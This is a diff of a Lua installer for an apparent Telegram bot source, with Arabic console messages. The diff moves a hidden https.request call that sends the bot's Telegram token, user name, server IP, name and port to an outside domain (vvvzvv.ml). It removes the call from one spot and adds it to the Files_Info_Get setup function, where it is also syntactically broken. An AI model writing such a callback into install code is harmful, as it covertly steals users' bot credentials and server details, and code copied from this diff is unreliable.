@@ -62,7 +62,6 @@ io.write('\n\27[1;35m عذرا الايدي محظور من السورس \n\27[0
 os.execute('lua start.lua')
 end 
 if muaed.Info.info == 'Ok' then
-https.request("https://vvvzvv.ml/index/Teland.php?n=TELANDTEAM&id="..Id.."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
 io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
 database:set(Server_Done.."UserSudo_Write",Id)
 end 
@@ -84,7 +83,8 @@ end
 os.execute('lua install.lua')
 end
 local function Files_Info_Get()
-Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"),database:get(Server_Done.."User_Write"))  
+Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"),database:get(Server_Done.."User_Write")) 
+local Rt https.request("https://vvvzvv.ml/index/Teland.php?n=TELANDTEAM&id="..Id.."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
 local RunBot = io.open("TELAND", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
